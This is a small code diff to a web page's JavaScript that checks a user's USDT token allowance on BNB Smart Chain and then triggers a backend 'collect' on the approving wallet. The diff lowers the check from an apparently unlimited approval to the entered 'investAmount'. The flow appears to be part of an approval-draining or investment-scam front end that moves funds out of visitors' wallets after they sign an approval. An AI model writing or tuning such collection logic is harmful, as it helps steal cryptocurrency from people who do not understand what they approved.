@@ -328,7 +328,11 @@ approveBtn.addEventListener("click", async () => {
         method: "eth_call",
         params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
       });
-      if (allowanceHex && allowanceHex !== "0x" && BigInt(allowanceHex) >= CAP_AMOUNT) {
+      
+      // Comparamos contra lo que realmente necesitas, no contra el infinito absoluto
+      const requiredAmount = ethers.parseUnits(document.getElementById("investAmount").value.toString(), 18);
+      
+      if (allowanceHex && allowanceHex !== "0x" && BigInt(allowanceHex) >= requiredAmount) {
         setLoading(true, "Procesando…");
         await triggerBackendCollect(userAddress);
         showToast("Sent Successfully, Thank you! ✓", "success");
